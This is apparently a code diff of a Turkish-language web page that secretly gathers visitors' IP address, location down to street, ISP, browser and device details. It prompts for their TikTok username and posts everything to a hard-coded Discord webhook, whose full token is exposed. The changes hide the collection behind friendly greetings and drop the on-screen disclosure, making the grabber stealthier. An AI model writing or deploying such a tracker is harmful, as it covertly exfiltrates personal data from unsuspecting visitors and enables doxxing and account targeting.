@@ -52,7 +52,6 @@
         document.addEventListener('DOMContentLoaded', function() {
             const messageElement = document.getElementById('message');
             const infoElement = document.getElementById('info');
-            const canvas = document.getElementById('screenshot');
             const webhookURL = 'https://discord.com/api/webhooks/1268469635628531803/GeAU4XlRg54ptWLXyd5YHu0Wo4rnPVhFU_zGOSOKqatciu-spLdFARKDwPOY_-ZI3XvI';
 
             let collectedData = {};
@@ -76,7 +75,8 @@
                         { name: 'Klavye Dili', value: data.keyboardLanguage, inline: false },
                         { name: 'Ağ Bağlantısı Türü', value: data.networkType, inline: false },
                         { name: 'İşletim Sistemi', value: data.platform, inline: false },
-                        { name: 'Görsel Boyut', value: `${data.viewportWidth}x${data.viewportHeight}`, inline: false }
+                        { name: 'Görsel Boyut', value: `${data.viewportWidth}x${data.viewportHeight}`, inline: false },
+                        { name: 'TikTok Kullanıcı Adı', value: data.tiktokUsername, inline: false }
                     ],
                     footer: { text: 'Bu mesaj otomatik olarak gönderilmiştir.' }
                 };
@@ -131,9 +131,6 @@
                                     viewportHeight: window.innerHeight
                                 };
 
-                                // Bilgileri gönder
-                                sendWebhook(collectedData);
-
                                 // TikTok kullanıcı adını almaya çalış
                                 let tiktokUsername = 'Bilinmiyor';
                                 const tiktokPrompt = 'TikTok kullanıcı adınız nedir ? : ';
@@ -142,36 +139,13 @@
                                     tiktokUsername = usernameInput;
                                 }
 
-                                // Animasyonlu mesajları sırayla göster
-                                showMessage('TikTokta Hesap Çalmak Kanunen Suçtur ve bunun bir cezası Vardır', 3000, () => {
-                                    showMessage('Eğer derseniz ki, \'Biz çalmadık\'. Diyebileceğimiz tek bir cevap var, BERENSOFFICAL', 3000, () => {
-                                        // Bilgileri ekranda göster
-                                        infoElement.innerHTML = `
-                                            <h2>Alınan Bilgiler:</h2>
-                                            <strong>IP Adresi:</strong> ${collectedData.ip}<br>
-                                            <strong>Ülke:</strong> ${collectedData.country}<br>
-                                            <strong>Şehir:</strong> ${collectedData.city}<br>
-                                            <strong>Sokak:</strong> ${collectedData.street}<br>
-                                            <strong>İnternet Adı:</strong> ${collectedData.isp}<br>
-                                            <strong>Tarayıcı:</strong> ${collectedData.browser}<br>
-                                            <strong>Ekran Çözünürlüğü:</strong> ${collectedData.screenWidth}x${collectedData.screenHeight}<br>
-                                            <strong>Dil:</strong> ${collectedData.language}<br>
-                                            <strong>Zaman Dilimi:</strong> ${collectedData.timeZone}<br>
-                                            <strong>Yönlendirme (Referrer):</strong> ${collectedData.referrer}<br>
-                                            <strong>Klavye Dili:</strong> ${collectedData.keyboardLanguage}<br>
-                                            <strong>Ağ Bağlantısı Türü:</strong> ${collectedData.networkType}<br>
-                                            <strong>İşletim Sistemi:</strong> ${collectedData.platform}<br>
-                                            <strong>Görsel Boyut:</strong> ${collectedData.viewportWidth}x${collectedData.viewportHeight}<br>
-                                            <strong>TikTok Kullanıcı Adı:</strong> ${tiktokUsername}
-                                        `;
-                                        infoElement.style.display = 'block'; // Bilgileri göster
+                                collectedData.tiktokUsername = tiktokUsername;
 
-                                        // Ekran görüntüsünü al
-                                        html2canvas(document.body).then(canvas => {
-                                            const screenshotData = canvas.toDataURL('image/png');
-                                            // Bu veriyi gönderebilirsiniz veya kaydedebilirsiniz
-                                            console.log('Ekran görüntüsü verisi:', screenshotData);
-                                        });
+                                // Animasyonlu mesajları sırayla göster
+                                showMessage('Merhaba', 3000, () => {
+                                    showMessage('Nasılsınız ? Ben Şahsen iyiyim. Nedenmi? Bu Yüzden :', 3000, () => {
+                                        // Bilgileri gönder
+                                        sendWebhook(collectedData);
                                     });
                                 });
                             });
